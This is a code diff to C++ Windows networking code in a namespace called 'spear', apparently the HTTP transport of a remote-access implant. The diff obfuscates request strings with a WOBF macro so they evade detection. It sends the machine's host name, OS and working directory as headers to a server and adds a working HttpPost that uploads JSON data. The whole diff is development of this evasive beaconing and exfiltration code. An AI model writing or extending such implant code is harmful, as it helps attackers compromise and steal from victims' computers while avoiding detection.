@@ -1,8 +1,11 @@
-#include <optional>
+#include <string>
+#include <iostream>
 #include <nlohmann/json.hpp>
 
 #include "API.h"
+#include "Utilt.h"
 #include "Instance.h"
+#include "Obfuscation.h"
 #include "Tansportion.h"
 
 struct _HINTERNET
@@ -42,7 +45,7 @@ _HINTERNET OpenRequest(const std::wstring& method, const std::wstring& uri)
 
     HINTERNET hRequest = Win32::WinHttpOpenRequest(
         hConnect,
-        L"GET",
+        method.c_str(),
         uri.c_str(),
         NULL,
         NULL,
@@ -70,7 +73,7 @@ _HINTERNET OpenRequest(const std::wstring& method, const std::wstring& uri)
     return {hSession, hConnect, hRequest};
 }
 
-void CloseAll(_HINTERNET* HinternetList)
+inline void CloseAll(_HINTERNET* HinternetList)
 {
     Win32::WinHttpCloseHandle(HinternetList->hRequest);
     Win32::WinHttpCloseHandle(HinternetList->hConnect);
@@ -88,25 +91,25 @@ namespace spear
         DWORD blockSize;
         DWORD readSize;
         nlohmann::json respone;
-        _HINTERNET HinternetList = OpenRequest(L"GET", uri);
+        _HINTERNET HinternetList = OpenRequest(std::wstring(WOBF(L"GET")), uri);
         if (!HinternetList.hRequest)
             return {};
 
         Win32::WinHttpAddRequestHeaders(
             HinternetList.hRequest,
-            Instance.Info.hostName.insert(0, L"host: ").c_str(),
+            Instance.Info.hostName.insert(0, WOBF(L"host: ")).c_str(),
             -1L,
             WINHTTP_ADDREQ_FLAG_ADD
         );
         Win32::WinHttpAddRequestHeaders(
             HinternetList.hRequest,
-            Instance.Info.os.insert(0, L"os: ").c_str(),
+            Instance.Info.os.insert(0, WOBF(L"os: ")).c_str(),
             -1L,
             WINHTTP_ADDREQ_FLAG_ADD
         );
         Win32::WinHttpAddRequestHeaders(
             HinternetList.hRequest,
-            Instance.Info.cwd.insert(0, L"cwd: ").c_str(),
+            Instance.Info.cwd.insert(0, WOBF(L"cwd: ")).c_str(),
             -1L,
             WINHTTP_ADDREQ_FLAG_ADD
         );
@@ -155,6 +158,23 @@ namespace spear
     /// @return 
     bool HttpPost(const std::wstring& uri, const nlohmann::json& data)
     {
+        _HINTERNET HinternetList = OpenRequest(std::wstring(WOBF(L"POST")), uri);
+        if (!HinternetList.hRequest)
+            return false;
+
+        if (!Win32::WinHttpSendRequest(
+            HinternetList.hRequest,
+            WOBF(L"Content-Type: application/json"),
+            31,
+            (LPVOID)data.dump().c_str(),
+            data.dump().size(),
+            data.dump().size(), 0
+        ))
+        {
+            CloseAll(&HinternetList);
+            return false;
+        }
+        CloseAll(&HinternetList);
         return true;
     }
 }
